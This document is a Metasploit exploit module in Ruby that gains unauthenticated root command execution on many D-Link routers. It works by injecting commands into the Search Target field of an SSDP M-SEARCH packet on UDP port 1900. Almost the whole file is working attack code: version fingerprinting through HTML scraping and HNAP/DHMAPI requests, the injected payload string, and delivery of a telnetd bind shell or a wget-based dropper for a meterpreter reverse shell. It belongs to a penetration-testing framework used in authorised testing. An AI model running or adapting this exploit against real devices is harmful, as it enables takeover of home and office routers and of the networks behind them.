##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'socket'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'D-Link Unauthenticated Remote Command Execution using UPnP via a special crafted M-SEARCH packet.',
        'Description' => %q{
          A command injection vulnerability exists in multiple D-Link network products, allowing an attacker
          to inject arbitrary command to the UPnP via a crafted M-SEARCH packet.
          Universal Plug and Play (UPnP), by default is enabled in most D-Link devices, on the port 1900.
          An attacker can perform a remote command execution by injecting the payload into the
          `Search Target` (ST) field of the SSDP M-SEARCH discover packet.
          After successful exploitation, an attacker will have full access with `root` user privileges.

          The following D-Link network products and firmware are vulnerable:
          - D-Link Router model DIR-300 revisions Ax with firmware v1.06 or older;
          - D-Link Router model DIR-300 revisions Bx with firmware v2.15 or older;
          - D-Link Router model DIR-600 revisions Bx with firmware v2.18 or older;
          - D-Link Router model DIR-645 revisions Ax with firmware v1.05 or older;
          - D-Link Router model DIR-815 revisions Bx with firmware v1.04 or older;
          - D-Link Router model DIR-816L revisions Bx with firmware v2.06 or older;
          - D-Link Router model DIR-817LW revisions Ax with firmware v1.04b01_hotfix or older;
          - D-Link Router model DIR-818LW revisions Bx with firmware v2.05b03_Beta08 or older;
          - D-Link Router model DIR-822 revisions Bx with firmware v2.03b01 or older;
          - D-Link Router model DIR-822 revisions Cx with firmware v3.12b04 or older;
          - D-Link Router model DIR-823 revisions Ax with firmware v1.00b06_Beta or older;
          - D-Link Router model DIR-860L revisions Ax with firmware v1.12b05 or older;
          - D-Link Router model DIR-859 revisions Ax with firmware v1.06b01Beta01 or older;
          - D-Link Router model DIR-860L revisions Ax with firmware v1.10b04 or older;
          - D-Link Router model DIR-860L revisions Bx with firmware v2.03b03 or older;
          - D-Link Router model DIR-865L revisions Ax with firmware v1.07b01 or older;
          - D-Link Router model DIR-868L revisions Ax with firmware v1.12b04 or older;
          - D-Link Router model DIR-868L revisions Bx with firmware v2.05b02 or older;
          - D-Link Router model DIR-869 revisions Ax with firmware v1.03b02Beta02 or older;
          - D-Link Router model DIR-880L revisions Ax with firmware v1.08b04 or older;
          - D-Link Router model DIR-890L/R revisions Ax with firmware v1.11b01_Beta01 or older;
          - D-Link Router model DIR-885L/R revisions Ax with firmware v1.12b05 or older;
          - D-Link Router model DIR-895L/R revisions Ax with firmware v1.12b10 or older;
          - probably more looking at the scale of impacted devices :-(
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Zach Cutlip', # Discovery of the vulnerability
          'Michael Messner <devnull@s3cur1ty.de>',
          'Miguel Mendez Z. (s1kr10s)',
          'Pablo Pollanco (secenv)',
          'Naihsin https://github.com/naihsin'

        ],
        'References' => [
          ['CVE', '2023-33625'],
          ['CVE', '2019–20215'],
          ['URL', 'https://attackerkb.com/topics/uqicA23ecz/cve-2023-33625'],
          ['URL', 'https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-rce-in-ssdpcgi-http-st-cve-2019-20215-en-2e799acb8a73'],
          ['URL', 'https://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html'],
          ['URL', 'https://github.com/naihsin/IoT/blob/main/D-Link/DIR-600/cmd%20injection/README.md']
        ],
        'DisclosureDate' => '2023-06-12',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_MIPSLE, ARCH_MIPSBE, ARCH_ARMLE],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/bind_busybox_telnetd'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_MIPSLE, ARCH_MIPSBE, ARCH_ARMLE],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'echo'],
              'Linemax' => 950,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/mipsbe/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('URN', [false, 'Set URN payload', 'urn:device:1']),
      OptInt.new('UPNP_PORT', [true, 'Universal Plug and Play (UPnP) UDP port', 1900])
    ])
  end

  def vuln_version?(res)
    # checks the model, firmware and hardware version
    @d_link = { 'product' => nil, 'firmware' => nil, 'hardware' => nil, 'arch' => nil }
    html = Nokogiri.HTML(res.body, nil, 'UTF-8')

    # USE CASE #1: D-link devices with static HTML pages with model and version information
    # class identifiers: <span class="product">, <span class="version"> and <span class="hwversion">
    # See USE CASE #4 for D-link devices that use javascript to dynamically generate the model and firmware version
    product = html.css('span[@class="product"]')
    @d_link['product'] = product[0].text.split(':')[1].strip unless product[0].nil?
    firmware = html.css('span[@class="version"]')
    @d_link['firmware'] = firmware[0].text.split(':')[1].strip unless firmware[0].nil?

    # DIR-600, DIR-300 hardware B revision  and maybe other models are using the "version" class tag for both firmware and hardware version
    @d_link['hardware'] = firmware[1].text.split(':')[1].strip unless firmware[1].nil?
    # otherwise search for the "hwversion" class tag
    hardware = html.css('span[@class="hwversion"]')
    @d_link['hardware'] = hardware[0].text.split(':')[1].strip unless hardware[0].nil?

    # USE CASE #2: D-link devices with static HTML pages with model and version information
    # class identifiers: <div class="pp">, <div class="fwv"> and <div class="hwv">
    if @d_link['product'].nil?
      product = html.css('div[@class="pp"]')
      @d_link['product'] = product[0].text.split(':')[1].strip unless product[0].nil?
      firmware = html.css('div[@class="fwv"]')
      @d_link['firmware'] = firmware[0].text.split(':')[1].strip unless firmware[0].nil?
      hardware = html.css('div[@class="hwv"]')
      @d_link['hardware'] = hardware[0].text.split(':')[1].strip unless hardware[0].nil?
    end

    # USE CASE #3: D-link devices with html below for model, firmware and hardware version
    # <td>Product Page&nbsp;:&nbsp;<a href='http://support.dlink.com.tw'  target=_blank><font class=l_tb>DIR-300</font></a>&nbsp;&nbsp;&nbsp;</td>
    # <td noWrap align="right">Hardware Version&nbsp;:&nbsp;rev N/A&nbsp;</td>
    # <td noWrap align="right">Firmware Version&nbsp;:&nbsp;1.06&nbsp;</td>
    if @d_link['product'].nil?
      hwinfo_table = html.css('td')
      hwinfo_table.each do |hwinfo|
        @d_link['product'] = hwinfo.text.split(':')[1].strip.gsub(/\p{Space}*/u, '') if hwinfo.text =~ /Product Page/i || hwinfo.text =~ /Product/i
        @d_link['hardware'] = hwinfo.text.split(':')[1].strip.gsub(/\p{Space}*/u, '') if hwinfo.text =~ /Hardware Version/i
        @d_link['firmware'] = hwinfo.text.split(':')[1].strip.gsub(/\p{Space}*/u, '') if hwinfo.text =~ /Firmware Version/i
      end
    end

    # USE CASE #4: D-Link devices with HTML listed below that contains the model, firmware and hardware version
    # <table id="header_container" border="0" cellpadding="5" cellspacing="0" width="838" align="center">
    # <tr>
    #   <td width="100%">&nbsp;&nbsp;<script>show_words(TA2)</script>: <a href="http://support.dlink.com.tw/">DIR-835</a></td>
    #   <td align="right" nowrap><script>show_words(TA3)</script>: A1 &nbsp;</td>
    #   <td align="right" nowrap><script>show_words(sd_FWV)</script>: 1.04</td>
    #   <td>&nbsp;</td>
    # </tr>
    # </table>
    if @d_link['product'].nil?
      hwinfo_table = html.css('table#header_container td')
      hwinfo_table.each do |hwinfo|
        @d_link['product'] = hwinfo.text.split(':')[1].strip.gsub(/\p{Space}*/u, '') if hwinfo.text =~ /show_words\(TA2\)/i
        @d_link['hardware'] = hwinfo.text.split(':')[1].strip.gsub(/\p{Space}*/u, '') if hwinfo.text =~ /show_words\(TA3\)/i
        @d_link['firmware'] = hwinfo.text.split(':')[1].strip.gsub(/\p{Space}*/u, '') if hwinfo.text =~ /show_words\(sd_FWV\)/i
      end
    end

    # USE CASE #5: D-Link devices with dynamically generated version and hardware information
    # Create HNAP POST request to get these hardware details
    if @d_link['product'].nil?
      xml_soap_data = <<~EOS
        <?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
              <GetDeviceSettings xmlns="http://purenetworks.com/HNAP1/" />
            </soap:Body>
          </soap:Envelope>
      EOS
      res = send_request_cgi({
        'method' => 'POST',
        'ctype' => 'text/xml',
        'uri' => normalize_uri(target_uri.path, 'HNAP1', '/'),
        'data' => xml_soap_data.to_s,
        'headers' => {
          'SOAPACTION' => '"http://purenetworks.com/HNAP1/GetDeviceSettings"'
        }
      })
      if res && res.code == 200 && res.body.include?('<GetDeviceSettingsResult>OK</GetDeviceSettingsResult>')
        xml = res.get_xml_document
        unless xml.blank?
          xml.remove_namespaces!
          @d_link['product'] = xml.css('ModelName').text
          @d_link['firmware'] = xml.css('FirmwareVersion').text
          @d_link['hardware'] = xml.css('HardwareVersion').text
        end
      end
    end

    # USE CASE #6: D-Link devices with dynamically generated version and hardware information
    # Create a DHMAPI POST request to get these hardware details
    if @d_link['product'].nil?
      xml_soap_data = <<~EOS
        <?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
              <GetDeviceSettings/>
            </soap:Body>
          </soap:Envelope>
      EOS
      res = send_request_cgi({
        'method' => 'POST',
        'ctype' => 'text/xml',
        'uri' => normalize_uri(target_uri.path, 'DHMAPI', '/'),
        'data' => xml_soap_data.to_s,
        'headers' => {
          'API-ACTION' => 'GetDeviceSettings'
        }
      })
      if res && res.code == 200 && res.body.include?('<GetDeviceSettingsResult>OK</GetDeviceSettingsResult>')
        xml = res.get_xml_document
        unless xml.blank?
          xml.remove_namespaces!
          @d_link['product'] = xml.css('ModelName').text
          @d_link['firmware'] = xml.css('FirmwareVersion').text
          @d_link['hardware'] = xml.css('HardwareVersion').text
        end
      end
    end

    # check the vulnerable product and firmware versions
    case @d_link['product']
    when 'DIR-300'
      if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.15') && @d_link['hardware'][0] == 'B'
        @d_link['arch'] = 'mipsle'
        return true
      elsif Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.06') # hardware version A
        @d_link['arch'] = 'mipsbe'
        return true
      end
    when 'DIR-600'
      @d_link['arch'] = 'mipsle'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.18') && @d_link['hardware'][0] == 'B'
    when 'DIR-645'
      @d_link['arch'] = 'mipsle'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.05') && (@d_link['hardware'][0] == 'A' || @d_link['hardware'] == 'N/A')
    when 'DIR-815'
      @d_link['arch'] = 'mipsle'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.04')
    when 'DIR-816L'
      @d_link['arch'] = 'mipsbe'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.06') && (@d_link['hardware'][0] == 'B' || @d_link['hardware'] == 'N/A')
    when 'DIR-817LW'
      @d_link['arch'] = 'mipsbe'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.04') && (@d_link['hardware'][0] == 'A' || @d_link['hardware'] == 'N/A')
    when 'DIR-818LW', 'DIR-818L'
      @d_link['arch'] = 'mipsbe'
      print_status(@d_link.to_s)
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.04') && @d_link['hardware'][0] == 'B'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.05') && @d_link['hardware'][0] == 'A'
    when 'DIR-822'
      @d_link['arch'] = 'mipsbe'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.03') && @d_link['hardware'][0] == 'B'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('3.12') && @d_link['hardware'][0] == 'C'
    when 'DIR-823'
      @d_link['arch'] = 'mipsbe'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.00') && @d_link['hardware'][0] == 'A'
    when 'DIR-850L'
      @d_link['arch'] = 'mipsbe'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.12') && (@d_link['hardware'][0] == 'A' || @d_link['hardware'] == 'N/A')
    when 'DIR-859'
      @d_link['arch'] = 'mipsbe'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.06') && @d_link['hardware'][0] == 'A'
    when 'DIR-860L'
      @d_link['arch'] = 'armle'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.10') && @d_link['hardware'][0] == 'A'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.03') && @d_link['hardware'][0] == 'B'
    when 'DIR-865L'
      @d_link['arch'] = 'mipsle'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.07') && @d_link['hardware'][0] == 'A'
    when 'DIR-868L'
      @d_link['arch'] = 'armle'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.12') && @d_link['hardware'][0] == 'A'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.05') && @d_link['hardware'][0] == 'B'
    when 'DIR-869'
      @d_link['arch'] = 'mipsbe'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.03') && @d_link['hardware'][0] == 'A'
    when 'DIR-880L'
      @d_link['arch'] = 'armle'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.08') && @d_link['hardware'][0] == 'A'
    when 'DIR-890L', 'DIR-890R'
      @d_link['arch'] = 'armle'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.11') && @d_link['hardware'][0] == 'A'
    when 'DIR-885L', 'DIR-885R'
      @d_link['arch'] = 'armle'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.12') && @d_link['hardware'][0] == 'A'
    when 'DIR-895L', 'DIR-895R'
      @d_link['arch'] = 'armle'
      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.12') && @d_link['hardware'][0] == 'A'
    end
    false
  end

  def execute_command(cmd, _opts = {})
    if datastore['URN']
      payload = "#{datastore['URN']};`#{cmd}`"
    else
      payload = "urn:device:1;`#{cmd}`"
    end
    print_status("payload: #{payload}")

    udp_sock = UDPSocket.open
    udp_sock.connect(datastore['RHOST'], datastore['UPNP_PORT'])
    header = "M-SEARCH * HTTP/1.1\r\n"
    header << 'HOST:' + datastore['RHOST'].to_s + ':' + datastore['UPNP_PORT'].to_s + "\r\n"
    header << "ST:#{payload}\r\n"
    header << "MX:2\r\n"
    header << "MAN:\"ssdp:discover\"\r\n\r\n"
    udp_sock.send(header, 0)
    udp_sock.close
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    res = send_request_cgi!({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path)
    })
    # Check if target is a D-Link network device
    return CheckCode::Unknown('No response received from target.') unless res
    return CheckCode::Safe('Likely not a D-Link network device.') unless res.code == 200 && (res.body =~ /d-link/i || res.body =~ /dlink/i)

    # check if firmware version is vulnerable
    return CheckCode::Appears("Product info: #{@d_link['product']}|#{@d_link['firmware']}|#{@d_link['hardware']}|#{@d_link['arch']}") if vuln_version?(res)
    # D-link devices with fixed firmware versions
    return CheckCode::Safe("Product info: #{@d_link['product']}|#{@d_link['firmware']}|#{@d_link['hardware']}|#{@d_link['arch']}") unless @d_link['arch'].nil?
    # D-link devices that still could be vulnerable with product information
    return CheckCode::Detected("Product info: #{@d_link['product']}|#{@d_link['firmware']}|#{@d_link['hardware']}|#{@d_link['arch']}") unless @d_link['product'].nil?

    # D-link devices that still could be vulnerable but no product information available
    return CheckCode::Detected
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end
  end
end
